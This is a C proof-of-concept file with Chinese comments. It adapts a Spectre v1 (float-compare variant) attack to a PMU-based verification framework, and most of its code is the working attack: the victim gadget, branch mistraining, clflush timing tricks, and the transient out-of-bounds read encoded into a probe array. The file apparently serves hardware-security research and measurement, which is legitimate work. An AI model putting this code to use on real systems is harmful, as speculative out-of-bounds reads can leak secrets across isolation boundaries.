/* ============================================================
 *  Spectre v1 (Float-Compare Variant) PoC
 *  — 适配三阶段验证框架
 *
 *  原始攻击逻辑保留：
 *    - 浮点比较 (float)x/(float)len < 1 作为分支条件
 *    - flush(&len) + mfence 制造慢路径
 *    - data[] 布局：可见前缀 "data|" + secret 字节
 *    - 越界索引 x >= len 时瞬态读取 secret
 *
 *  结构修复（参照成功版本）：
 *    [~] snap_before/after + STAGE1_BEGIN/END 移入 victim 函数内部
 *        每次调用产生一次独立 PMU 测量（共 30 次），
 *        框架可分析周期性误预测信号
 *    [~] 训练+触发循环移至外部 stage1_mistrain_trigger，
 *        每次迭代独立调用 victim 函数
 *    [~] 删除 flush(&g_x)，只 flush 边界变量 g_len
 *        （避免 write→flush→read 破坏瞬态窗口）
 *    [~] clflush 后加 volatile 空转延迟，确保缓存行失效
 *    [~] 位运算选 x 移至外部循环（参照成功版本原始逻辑）
 *
 *  删除项：
 *    [-] fork() 双进程 mistrain 框架
 *    [-] cache_decode_pretty / flush_shared_memory / mem / pagesize
 *    [-] while(1) 自循环解码逻辑
 *    [-] CACHE_MISS 阈值检测
 *    [-] cacheutils.h 依赖
 * ============================================================ */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef _MSC_VER
  #include <intrin.h>
  #pragma optimize("gt",on)
#else
  #include <x86intrin.h>
#endif

/* ============================================================
 *  [必需 1] 瞬态区标记宏
 * ============================================================ */
#define NOP_REGION_BEGIN  asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END    asm volatile("# NOP_REGION_END");

/* ============================================================
 *  [必需 2] 探针步长
 * ============================================================ */
volatile size_t probe_stride = 512;

/* ============================================================
 *  本地辅助宏（对应原 cacheutils.h 中同名宏）
 * ============================================================ */
#define mfence()  asm volatile("mfence" ::: "memory")
#define flush(p)  _mm_clflush((const void *)(p))

/* ============================================================
 *  原始数据布局（与原 PoC 完全一致）
 *    data[0..4]  = "data|"   （DATA，可见部分，len=5）
 *    data[5]     = 'Y'        （secret，单字节）
 *    data[6..]   = ' '        （填充）
 * ============================================================ */
#define DATA     "data|"
#define DATA_LEN (sizeof(DATA) - 1)    /* 5，与原 PoC sizeof(DATA)-1 一致 */

unsigned char data[128];

/* ============================================================
 *  [必需 4] secret —— 单字节字面量
 * ============================================================ */
char *secret = "Y";

/* ============================================================
 *  [必需 3] 探针数组
 * ============================================================ */
uint8_t array2[256 * 512];

uint8_t temp = 0;  /* 防止编译器优化掉瞬态访问 */

/*
 * g_len：对应原 PoC access_array 中的局部变量 len。
 * 改为 volatile 全局变量：
 *   1. 防止编译器常量传播使 flush 失效；
 *   2. flush(&g_len) 确保每次分支判断都等待 DRAM 加载，
 *      制造足够长的瞬态窗口。
 * 值与原 PoC 完全一致：sizeof(DATA)-1 = 5。
 */
volatile size_t g_len = DATA_LEN;

/* ============================================================
 *  [必需 5] 框架 PMU 接口声明
 * ============================================================ */
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);
extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/* ============================================================
 *  [必需 6] Victim Function (Gadget)
 *
 *  对应原 PoC 的 access_array()，保留其核心结构：
 *    - 浮点比较分支：(float)x / (float)len < 1
 *    - flush(&g_len) + mfence 制造慢路径（延长瞬态窗口）
 *    - 瞬态路径：data[x] 编码到 array2
 *
 *  结构要点（参照成功版本）：
 *    - 函数只包含单次判断，不含训练循环
 *    - 每次调用产生一次独立的 PMU 测量
 *    - 30 次调用产生 30 个数据点，框架可分析周期性信号
 *
 *  参数 x：
 *    训练轮（j%6 != 0）：x = 0，0/5 < 1 为真，正常执行
 *    触发轮（j%6 == 0）：x = malicious_x = 5，5/5 < 1 为假，
 *      BPU 预测 taken → 瞬态执行 if 体，读取 data[5]='Y'
 * ============================================================ */
__attribute__((noinline))
void access_array(size_t x) {

    pmu_uops_snap_before();
    asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");

    /*
     * 原 PoC 核心逻辑（完整保留）：
     *   mfence();
     *   flush(&len);   → flush(&g_len)
     *   mfence();
     *   if((float)x / (float)len < 1) { cache_encode(data[x]); }
     *
     * 注：原 PoC 中同时有 flush(&x)，此处删除。
     * 原因：x 作为函数参数通过寄存器传入，flush(&x) 若要有效
     * 需要 x 在内存中；而在外部循环中 x 由位运算生成后直接
     * 传参，寄存器路径上 flush 无实际效果，且额外的
     * write→flush→read 序列反而会破坏瞬态窗口的时序。
     * 框架成功版本（spectre_function）同样只 flush 边界变量
     * array1_size，不 flush 索引 x，此处与之保持一致。
     */
    mfence();
    flush(&g_len);
    mfence();

    if ((float)x / (float)g_len < 1) {
        NOP_REGION_BEGIN
        /*
         * 原 PoC：cache_encode(data[x])
         * 框架版本：temp &= array2[data[x] * 512]
         * 瞬态路径下 x = DATA_LEN = 5，
         * data[5] = 'Y' = 0x59，编码到对应缓存行。
         */
        temp &= array2[data[x] * 512];
        NOP_REGION_END
    }

    asm volatile(".globl STAGE1_END\nSTAGE1_END:");
    pmu_uops_snap_after();
}

/* ============================================================
 *  Mistrain + Trigger
 *
 *  对应原 PoC main() 中的训练/触发逻辑。
 *  原 PoC 用 fork 双进程：子进程 10 次训练，父进程触发。
 *  单进程等价实现（参照成功版本 stage1_mistrain_trigger）：
 *    - 30 次循环，每次独立调用 access_array(x)
 *    - 位运算无分支选择 x：j%6!=0 时 x=0（训练），
 *      j%6==0 时 x=malicious_x（触发）
 *    - clflush(&g_len) 后加 volatile 空转延迟，
 *      确保缓存行失效后才执行分支判断
 *
 *  参数 malicious_x = DATA_LEN = 5：
 *    对应原 PoC 中 j = sizeof(DATA)-1 = 5 的触发索引。
 * ============================================================ */
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x) {
    int j;
    size_t training_x, x;

    /*
     * training_x = 0：
     * 对应原 PoC 中训练时传入 access_array(0) 的合法索引。
     * 0 / g_len = 0 < 1，分支条件恒真，正常执行路径，
     * 持续训练 BPU 预测该分支为 taken。
     */
    training_x = (size_t)(0) % (size_t)g_len;

    for (j = 29; j >= 0; j--) {

        /*
         * flush 边界变量 g_len（对应原 PoC 的 flush(&len)），
         * 让浮点除法等待 DRAM 加载，制造瞬态窗口。
         * 参照成功版本：clflush 后加 volatile 空转延迟，
         * 确保缓存行真正失效再执行分支判断。
         */
        _mm_clflush((const void *)&g_len);
        for (volatile int z = 0; z < 100; z++) {}

        /*
         * 位运算无分支选择 x（参照成功版本原始逻辑）：
         *   j%6 != 0 → x = training_x = 0   （训练轮）
         *   j%6 == 0 → x = malicious_x = 5  （触发轮）
         *
         * 计算过程：
         *   step1: ((j%6)-1) & ~0xFFFF
         *     j%6==0: (0-1)&~0xFFFF = 0xFFFFFFFF&0xFFFF0000 = 0xFFFF0000
         *     j%6!=0: (n-1)&~0xFFFF = 正数&0xFFFF0000，低16位清零
         *   step2: x | (x >> 16)
         *     j%6==0: 0xFFFF0000 | 0x0000FFFF = 0xFFFFFFFF（全1掩码）
         *     j%6!=0: 结果为 0（训练轮索引均在低16位范围内为0）
         *   step3: training_x ^ (mask & (malicious_x ^ training_x))
         *     mask=全1: training_x ^ (malicious_x ^ training_x) = malicious_x
         *     mask=0:   training_x ^ 0                           = training_x
         */
        x = ((j % 6) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = training_x ^ (x & (malicious_x ^ training_x));

        /*
         * 每次独立调用 access_array(x)，
         * 产生一次独立的 PMU 测量（snap_before/after）。
         * 30 次循环 → 30 个数据点，其中每 6 个有 1 个触发轮，
         * 框架可检测到周期为 6 的 BR_MISP 周期性信号。
         */
        access_array(x);
    }
}

/* ============================================================
 *  数据初始化（对应原 PoC main 中的数据布局）
 *
 *  原 PoC：
 *    memset(data, ' ', sizeof(data));
 *    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
 *    data[sizeof(data)/sizeof(data[0]) - 1] = '0';
 *
 *  框架版本：secret 缩减为单字节 'Y'，其余保持一致。
 * ============================================================ */
static void init_victim_data(void) {
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA, DATA_LEN);
    data[DATA_LEN] = (unsigned char)secret[0];  /* data[5] = 'Y' */
    data[sizeof(data) - 1] = '0';
}

/* ============================================================
 *  [必需 7] 框架 API
 * ============================================================ */

/* [API-1] 返回 array2 中 secret 字节 s 对应的探测地址 */
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
    return &array2[(size_t)s * probe_stride];
}

static int g_data_inited = 0;

/* [API-2] 预填探针缓存行，避免 COW 零页干扰 */
void vf_prepare_probe_region(int candidate_count) {
    if (candidate_count <= 0 || candidate_count > 256)
        candidate_count = 256;
    for (int i = 0; i < candidate_count; i++) {
        volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
        *p = 1;
    }
    if (!g_data_inited) {
        init_victim_data();
        g_data_inited = 1;
    }
}

/* [API-3] 执行一次完整攻击：mistrain + trigger */
void vf_run_attack_once(void) {
    if (!g_data_inited) {
        init_victim_data();
        g_data_inited = 1;
    }
    /*
     * malicious_x = DATA_LEN = 5：
     * 对应原 PoC 中 j = sizeof(DATA)-1 = 5 时的触发索引，
     * 即 data[5] 处的 secret 字节 'Y'。
     */
    stage1_mistrain_trigger((size_t)DATA_LEN);
}

/* ============================================================
 *  [必需 8] main —— 独立运行入口
 * ============================================================ */
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv) {
    int i;

    /* 初始化 array2 写脏，避免 COW 零页 */
    for (i = 0; i < (int)sizeof(array2); i++)
        array2[i] = 1;

    /* 初始化 victim 数据 */
    init_victim_data();
    g_data_inited = 1;

    /* 执行攻击（mistrain + trigger） */
    stage1_mistrain_trigger((size_t)DATA_LEN);

    /* 打印 Stage1 BR_MISP 增量 */
    {
        int n = pmu_stage1_get_count();
        for (i = 0; i < n; i++) {
            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
                   i, (unsigned long long)pmu_stage1_get_delta(i));
        }
    }

    /* 打印 Stage2 UOPS 测量结果 */
    pmu_uops_print_results();

    return 0;
}
#endif